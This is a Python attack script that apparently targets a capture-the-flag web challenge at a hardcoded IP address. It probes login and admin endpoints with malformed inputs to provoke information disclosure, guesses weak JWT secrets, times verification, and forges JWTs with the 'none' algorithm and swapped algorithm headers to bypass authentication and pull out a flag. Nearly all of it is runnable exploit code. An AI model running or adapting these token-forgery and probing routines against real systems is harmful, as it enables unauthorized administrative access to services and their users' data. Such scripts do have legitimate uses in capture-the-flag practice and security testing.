#!/usr/bin/env python3
"""
Extract information from the application
"""

import requests
import jwt
import json

TARGET_URL = "http://138.199.163.92:12973/"

def test_error_messages():
    """Test for information disclosure in error messages"""
    print("="*60)
    print("TESTING ERROR MESSAGES")
    print("="*60)
    
    session = requests.Session()
    
    # Try to trigger different errors
    tests = [
        ("POST /login with empty", TARGET_URL + 'login', {}),
        ("POST /login with null", TARGET_URL + 'login', {"username": None, "password": None}),
        ("POST /login with array", TARGET_URL + 'login', {"username": [], "password": []}),
        ("POST /login with long string", TARGET_URL + 'login', {"username": "A"*10000, "password": "B"*10000}),
        ("GET /admin with malformed token", TARGET_URL + 'admin', None),
        ("GET /admin with invalid JWT", TARGET_URL + 'admin', None),
    ]
    
    for name, url, payload in tests:
        print(f"\n[*] {name}")
        try:
            if payload is not None:
                resp = session.post(url, json=payload, timeout=3)
            else:
                if "malformed" in name:
                    headers = {"Authorization": "Bearer AAAA.BBBB.CCCC"}
                    resp = session.get(url, headers=headers, timeout=3)
                elif "invalid" in name:
                    # Create a valid JWT structure but with wrong signature
                    fake_token = jwt.encode({"role": "admin"}, "wrongsecret", algorithm="HS256")
                    headers = {"Authorization": f"Bearer {fake_token}"}
                    resp = session.get(url, headers=headers, timeout=3)
                else:
                    resp = session.get(url, timeout=3)
            
            print(f"    Status: {resp.status_code}")
            print(f"    Response: {resp.text[:300]}")
            
            # Look for information disclosure
            if any(word in resp.text.lower() for word in ['secret', 'key', 'password', 'token', 'algorithm', 'hs256', 'hs512']):
                print(f"    [!] Possible information disclosure!")
        except Exception as e:
            print(f"    Error: {e}")

def test_timing_attack():
    """Test for timing differences that might reveal the secret"""
    print("\n" + "="*60)
    print("TIMING ATTACK TEST")
    print("="*60)
    
    import time
    
    session = requests.Session()
    
    secrets_to_test = ["s000", "s0000", "wrong", "admin", "secret"]
    
    print("Testing JWT verification timing...")
    
    for secret in secrets_to_test:
        token = jwt.encode({"role": "admin"}, secret, algorithm="HS256")
        headers = {"Authorization": f"Bearer {token}"}
        
        times = []
        for _ in range(3):
            start = time.time()
            try:
                resp = session.get(TARGET_URL + 'admin', headers=headers, timeout=3)
                end = time.time()
                times.append(end - start)
            except:
                pass
        
        if times:
            avg_time = sum(times) / len(times)
            print(f"Secret '{secret}': avg {avg_time:.4f}s")

def check_jwt_header_manipulation():
    """Try JWT header manipulation attacks"""
    print("\n" + "="*60)
    print("JWT HEADER MANIPULATION")
    print("="*60)
    
    session = requests.Session()
    
    # Try to create JWT with different algorithms
    import base64
    
    # Create a JWT with alg: none
    header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip('=')
    payload_data = base64.urlsafe_b64encode(json.dumps({"role": "admin"}).encode()).decode().rstrip('=')
    
    # None algorithm - no signature
    token_none = f"{header}.{payload_data}."
    
    print(f"[*] Testing 'none' algorithm")
    print(f"    Token: {token_none[:50]}...")
    
    headers = {"Authorization": f"Bearer {token_none}"}
    resp = session.get(TARGET_URL + 'admin', headers=headers, timeout=3)
    
    print(f"    Status: {resp.status_code}")
    if resp.status_code == 200:
        print(f"    [!!!] SUCCESS!")
        print(resp.text)
        
        if 'kaal{' in resp.text.lower():
            import re
            flag = re.search(r'Kaal\{[^}]+\}', resp.text, re.IGNORECASE)
            if flag:
                return flag.group(0)
    
    # Try changing alg to HS512 or RS256
    for alg in ["HS512", "RS256", "HS384"]:
        print(f"\n[*] Testing algorithm: {alg}")
        try:
            token = jwt.encode({"role": "admin"}, "secret", algorithm=alg if alg.startswith("HS") else "HS256")
            # Manually change the algorithm in header
            parts = token.split('.')
            header_data = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            header_data['alg'] = alg
            new_header = base64.urlsafe_b64encode(json.dumps(header_data).encode()).decode().rstrip('=')
            modified_token = f"{new_header}.{parts[1]}.{parts[2]}"
            
            headers = {"Authorization": f"Bearer {modified_token}"}
            resp = session.get(TARGET_URL + 'admin', headers=headers, timeout=3)
            
            if resp.status_code == 200:
                print(f"    [!!!] SUCCESS with {alg}!")
                print(resp.text)
                
                if 'kaal{' in resp.text.lower():
                    import re
                    flag = re.search(r'Kaal\{[^}]+\}', resp.text, re.IGNORECASE)
                    if flag:
                        return flag.group(0)
        except Exception as e:
            print(f"    Error: {e}")
    
    return None

def main():
    print("INFORMATION EXTRACTION")
    print()
    
    test_error_messages()
    
    result = check_jwt_header_manipulation()
    if result:
        print(f"\n{'='*60}")
        print(f"FLAG: {result}")
        print(f"{'='*60}")
        return
    
    test_timing_attack()
    
    print("\n" + "="*60)
    print("Information extraction complete")
    print("="*60)

if __name__ == "__main__":
    main()
